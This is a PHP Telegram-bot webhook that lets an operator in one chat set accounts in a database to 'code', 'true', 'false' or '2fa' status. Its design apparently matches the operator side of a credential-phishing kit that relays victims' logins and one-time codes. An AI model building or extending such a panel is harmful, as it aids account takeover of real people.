<?php
require 'db.php';
require 'config.php';

$data = json_decode(file_get_contents('php://input'), TRUE);
//fil_put_contents('bot_log.txt', print_r($data, 1)."\n", FILE_APPEND);

if (isset($data['callback_query']) && $data['callback_query']['message']['chat']['id'] == $chat_id) {
    $message = $data['callback_query']['data'];
    $command = explode(" ", $message);

    $id = $command[1];

    switch ($command[0]) {
        case '/code':
            $sql = "UPDATE accounts SET status=? WHERE id=? LIMIT 1";
            $pdo->prepare($sql)->execute(['code', $id]);
            break;

        case '/true':
            $sql = "UPDATE accounts SET status=? WHERE id=? LIMIT 1";
            $pdo->prepare($sql)->execute(['true', $id]);
            break;

        case '/false':
            $sql = "UPDATE accounts SET status=? WHERE id=? LIMIT 1";
            $pdo->prepare($sql)->execute(['false', $id]);
            break;

        case '/2fa':
            $sql = "UPDATE accounts SET status=? WHERE id=? LIMIT 1";
            $pdo->prepare($sql)->execute(['2fa', $id]);
            break;
    }

    $response = "Команда выполнена!";
    $botUrl = "https://api.telegram.org/bot" . $token . "/answerCallbackQuery";
    $postFields = array('callback_query_id' => $data['callback_query']['id'], 'text' => $response);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type:multipart/form-data"));
    curl_setopt($ch, CURLOPT_URL, $botUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    $output = curl_exec($ch);

    header("Content-Type: application/json");
    $parameters = array('chat_id' => $chat_id, "text" => $response);
    $parameters["method"] = "sendMessage";
    echo json_encode($parameters);
}